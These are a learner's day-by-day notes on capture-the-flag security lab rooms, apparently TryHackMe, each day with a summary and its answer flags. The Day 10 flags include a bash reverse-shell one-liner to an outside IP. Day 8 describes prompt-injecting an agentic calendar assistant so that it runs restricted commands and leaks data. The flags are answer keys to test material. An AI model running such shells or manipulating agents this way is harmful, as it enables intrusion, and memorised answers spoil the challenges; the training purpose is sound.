# Day 1.
This day covered the basics of linux CLI which oversaw the learning of `echo` `cat` `ls` `grep` `cd` `find` `rm` as well as detailing piping of commands, switching users, sudo, bash history as well as shell scripts. 

## Flags:
```
THM{learning-linux-cli}
THM{sir-carrotbane-attacks}
THM{until-we-meet-again}
```

***

# Day 2.
This day oversaw the leaning of phishing as well as social engineering to hack into a system and gain ones personal data. Using the Social Engineer Toolkit, we generate a phishing email to test the vulnerability of an enterprise.

## Flags
```
unranked-wisdom-anthem
1984000
```

***

# Day 3. 
This day delved into log analysis with splunk in which we see a the web-traffic of a system. We see areas where there is a massive spike of requests and point out any anomalies which can hint at a malicious user. We also learn to spot dangerous SQL injections from an IP. Also delved in spotting C2 comms and Remote Code Execution (RCE). 

## Flags
```
198.51.100.55
2025-10-12
993
658
126167
```

***

# Day 4
This day spoke about the use of AI in cybersecurity to process large amounts of data, analyse behaviour and logs for suspicious activity. It is an essential tool to allow for us to spend mental prowess in areas that matter and allocate menial and automated tasks to AI. This day oversaw us interacting with Van SolveIT which is an assistant that can generate and use an exploit script, analyse web logs of an attack that has occurred as well as look into its very own source code for vulnerabilities. 

## Flags. 
```
THM{AI_MANIA}
THM{SQLI_EXPLOIT}
```

***

# Day 5.
This challenge was very much off webex where we learnt about Insecure Direct Object Reference and how exploiting a website can be used to gain information which we aren't authorised to see. Also learnt about horizontal and vertial privilige escalation. We work on a sandbox website of vouchers and modify our cookie user value to different increments to gain higher-levels of access across the system.

## Flags
```
Insecure Direct Object Reference
Horizontal
15
```

***

# Day 6.
Day 6 focused on the use of malware analysis and how we can use sandboxes to monitor malware activity with a set of specialised tools. We've seen the differences between static and dynamic analysis. Challenge utilised PeStudio for Static analysis to find value of a checksum as well as strings of the program and a combination of Regshot and ProcMon to perform dynamic analysis of the malware. The filtering of process names and operations give us our keys in the challenges.

## Flags
```
F29C270068F865EF4A747E2683BFA07667BF64E768B38FBB9A2750A3D879CA33
THM{STRINGS_FOUND}
HKU\S-1-5-21-1966530601-3185510712-10604624-1008\Software\Microsoft\Windows\CurrentVersion\Run\HopHelper
http
```

***

# Day 7.
This day analysed network forensics through the use of `nmap` and `nc` to perform serverside analysis. We also used the `ftp` command to perform digging of the key under another port. We also used nc for TCP and UDP port scans to look into the key which we pinpoint using the `dig` command. The final part involed running a server-end listening of its ports and using mysql to obtain the final flag. 

## Flags
```
Pwned by HopSec
3aster_
15_th3_
n3w_xm45
3306
THM{4ll_s3rvice5_d1sc0vered}
```
***

# Day 8.
Today was a touch on the art of prompt engineering, essentially using the agentic AI on the calendar website to proceed with commands which we aren't actually authorised to perform. This is through the use of the AI's Chain-of-Thought reasoning which it displays to us, thus allowing for us to view potentially sensitive information and further give it a prompt to perform something it inherently shouldn't. Thereby executing restricted commands and leaking sensitive information. 

## Flags
```
THM{XMAS_IS_COMING__BACK}
```

***

# Day 9.
This day focused on the importance of passwords, utilising brute-force attacks and dictionaries on two encyrpyted, password-protected files. One being a .zip containing a .txt file and the other being a .pdf. 
Here we've used the pdfcrack terminal command to work off of a dictionary to accurately guess the password of the pdf file and break it.
Further, we use john to break into the .zip file via brute-force. 
The challenges also rotated about masked attacks and hashcat which utilises GPU-acceleration to crack passwords.
Finally culminating in a response playbook to detect if a system is running password breaking software, so as to decet and prevent the leaking of important data(i.e - passwords). 

## Flags
```
THM{Cr4ck1ng_PDFs_1s_34$y}
THM{Cr4ck1n6_z1p$_1s_34$yyyy}
```

***

# Day 10.
In this room we got to use Azure Sentinel where we view the logs by running queries, this process utilises a more analyst perspective wehre we categorise the severity of problems too. We just modify search filters and find server logs to grant the flag. This day was put off quite a while as the labs didn't seem to be working too well. 

## Flags 
```
10
High
4
malicious_mod.ko
/bin/bash -i >& /dev/tcp/198.51.100.22/4444 0>&1
172.16.0.12
203.0.113.45
deploy
```

***

# Day 11.
Today's challenge room required us to delve into Cross-Site Scripting (XSS) and exploiting it over a webpage given to us. Mutating payloads to gain access and make the server execute commands as we wish. We also learnt the differences between reflected and stored XSS and how we can protect and exploit against this system of attack.

## Flags
```
stored
THM{Evil_Bunny}
THM{Evil_Stored_Egg}
```

***

# Day 12.
This room had us delve into phishing and how it can be used as a social engineering tactic to gain access into operations and corportate systems. This day had us classify emails as spam or phishing and classify the type of social engineering going on there, we delved into tyopsquatting, spoofing and punycode as well as impersonation. 

## Flags
```
THM{yougotnumber1-keep-it-going}
THM{nmumber2-was-not-tha-thard!}
THM{Impersonation-is-areal-thing-keepIt}
THM{Get-back-SOC-mas!!}
THM{It-was-just-a-sp4m!!}
THM{number6-is-the-last-one!-DX!}
```

***

# Day 13.
This room had us explore YARA and it's rules which we can define to detect malware and it's patterns and behaviours. Which range from Post-incident analysis: when the security team needs to verify whether traces of malware found on one compromised host still exist elsewhere in the environment.
Threat Hunting: searching through systems and endpoints for signs of known or related malware families.
Intelligence-based scans: applying shared YARA rules from other defenders or kingdoms to detect new indicators of compromise.
Memory analysis: examining active processes in a memory dump for malicious code fragments.
This rooms focused on the implementation of searching strings and hex along with working with conditions. 


## Flags
```
5
/TBFC:[A-Za-z0-9]+/
Find me in HopSec Island
```

***

# Day 14.
Today's chalenge dealt with Docker and explaining containers. Here we work with an actual container and fiddle with various commands which we run. 

## Flags
```
docker ps
Dockerfile
THM{DOCKER_ESCAPE_SUCCESS}
DeployMaster2025!
```

***

# Day 15.
Todays challenge also continued on splunk to analyse suspicious web commands and exploits on a server. This was again more analytical and delved into search values and filters amongst raw data and dates.

## Flags 
```
whoami.exe
PowerShell.exe
```

***

# Day 16.
Today's challenge focused on the utlisation on the windows registry and its specific hives to look into. We use forensics via registry editor and registry explorer to analyse hives of compromised systems.

## Flags
```
DroneManager Updater
C:\Users\dispatch.admin\Downloads\DroneManager_Setup.exe
"C:\Program Files\DroneManager\dronehelper.exe" --background
```

***

# Day 17. + 18
These two rooms focused on using webexp and cyrptography via inspecting a website and cyberchef to decode encrypted passcodes and data. Very straightforward. Also dealt with Obfuscation and Deobfuscation. Self explainatory.

## Flags
```
Iamsofluffy
Itoldyoutochangeit!
BugsBunny
passw0rd1
51rBr34chBl0ck3r
THM{M3D13V4L_D3C0D3R_4D3P7}
THM{C2_De0bfuscation_29838}
THM{API_Obfusc4tion_ftw_0283}
```

***

# Day 19.
